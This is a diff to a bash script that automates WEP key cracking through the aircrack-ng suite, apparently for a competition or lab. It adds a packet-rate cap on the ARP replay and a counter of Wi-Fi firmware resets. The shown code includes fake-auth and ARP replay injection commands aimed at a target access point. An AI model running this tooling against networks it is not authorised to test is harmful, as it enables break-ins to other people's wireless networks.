@@ -15,8 +15,8 @@
 #                 half of the writeup.
 #
 # Usage:
-#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
-#   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
+#   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
+#   sudo ./scripts/wep-crack.sh -M wlp2s0mon -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N] [-x pps]
 #
 # Example:
 #   sudo ./scripts/wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
@@ -25,6 +25,9 @@
 # competition-deauth.sh -i started. This run neither starts nor stops it and does not change its
 # channel, so the card must already be on -c. The monitor stays up when this run exits, and the run
 # that started it stops it. Give -i or -M, not both.
+#
+# -x <pps> caps the ARP replay at that many packets a second (aireplay-ng -x). Unset, the replay runs
+# uncapped. The progress lines count the Wi-Fi card's firmware restarts (FW resets) since this run started.
 #
 # Monitor mode, the capture and the WiFi recovery come from wifi-lib.sh, the same
 # code that airodump.sh and injection-test.sh use. Cleanup runs on exit, including
@@ -52,8 +55,9 @@ MIN_IVS=40000            # first attempt here: PTW breaks half of 104-bit keys u
 RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)
 STALL_SECS=60            # warn when no ARP ACK arrives for this long (active mode)
 MAX_FAKEAUTH_FAILS=3     # fake-auth relaunches in a row that never associate before the run stops
+RATE_CAP=""              # -x: ARP replay packets per second. Empty = uncapped
 
-while getopts ":i:M:b:c:e:m:o:t:h" opt; do
+while getopts ":i:M:b:c:e:m:o:t:x:h" opt; do
   case "$opt" in
     i) IFACE="$OPTARG" ;;
     M) MONIFACE="$OPTARG" ;;
@@ -63,6 +67,7 @@ while getopts ":i:M:b:c:e:m:o:t:h" opt; do
     m) MODE="$OPTARG" ;;
     o) PREFIX="$OPTARG" ;;
     t) IV_TARGET="$OPTARG" ;;
+    x) RATE_CAP="$OPTARG" ;;
     h) usage 0 ;;
     *) usage ;;
   esac
@@ -74,6 +79,7 @@ wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemc
 [[ -z "$IFACE" || -z "$MONIFACE" ]] || die "Give -i or -M, not both: -i starts monitor mode here, -M uses one that is up."
 [[ "$MODE" == "active" || "$MODE" == "passive" ]] || die "-m must be active|passive. For a monitor that is already up, use -M."
 [[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || die "-t must be a positive number of IVs"
+[[ -z "$RATE_CAP" || "$RATE_CAP" =~ ^[1-9][0-9]*$ ]] || die "-x must be a positive number of packets per second"
 if [[ -n "$MONIFACE" ]]; then
   [[ "$(iface_type "$MONIFACE")" == monitor ]] ||
     die "$MONIFACE is not in monitor mode, so nothing was changed. Check: iw dev. Or give -i to start monitor mode here."
@@ -93,6 +99,7 @@ AIRMON_LOG="$RUNDIR/airmon.log"
 OUT="${RUNDIR}/${PREFIX}"
 KEYFILE="${OUT}.key"
 echo "[*] Run folder: $RUNDIR"
+RUN_START=$(date +%s)  # firmware restarts are counted in the kernel log from here
 
 # ---- start capture --------------------------------------------------------
 wifi_guard "${IFACE:-$MONIFACE}"
@@ -169,7 +176,8 @@ if [[ "$MODE" == "active" ]]; then
   echo "[*] Associating with AP (fake auth)..."
   start_fakeauth
   echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
-  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" ) \
+  [[ -n "$RATE_CAP" ]] && echo "[*] ARP replay capped at ${RATE_CAP} packets per second (-x)."
+  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" ${RATE_CAP:+-x "$RATE_CAP"} "$MON" ) \
     >"${OUT}-arpreplay.txt" 2>&1 &
   arp_pid=$!
   track_pid "$arp_pid"
@@ -195,6 +203,11 @@ arp_acks() {
   n=$(tail -c 4096 "${OUT}-arpreplay.txt" 2>/dev/null | tr '\r' '\n' | grep -a 'ARP requests and' | tail -n 1 |
     sed -nE 's/.*ARP requests and ([0-9]+) ACKs.*/\1/p')
   echo "${n:-0}"
+}
+
+# Firmware restarts of the Wi-Fi card since this run started. The kernel logs one "Microcode SW error" per restart.
+fw_resets() {
+  journalctl -k --no-pager --since "@$RUN_START" 2>/dev/null | grep -c "Microcode SW error"
 }
 
 # Warns once when no ARP ACK arrives for STALL_SECS (IVs can come from other clients).
@@ -259,7 +272,7 @@ while true; do
   # The rate is per real second: a slow aircrack try can make the loop take longer than RETRY_SECS.
   now=$(date +%s.%N)
   rate=$(awk -v d="$((ivs - prev_iv))" -v a="$prev_time" -v b="$now" 'BEGIN { t = b - a; printf "%+d", (t > 0 ? d / t : 0) }')
-  echo "    $(date +%H:%M:%S)  IVs ${ivs} (${rate} IV/s)  ${replay}"
+  echo "    $(date +%H:%M:%S)  IVs ${ivs} (${rate} IV/s)  ${replay}  FW resets $(fw_resets)"
   if [[ "$MODE" == "active" ]]; then
     check_stall "$acks" "$(date +%s)"
   fi
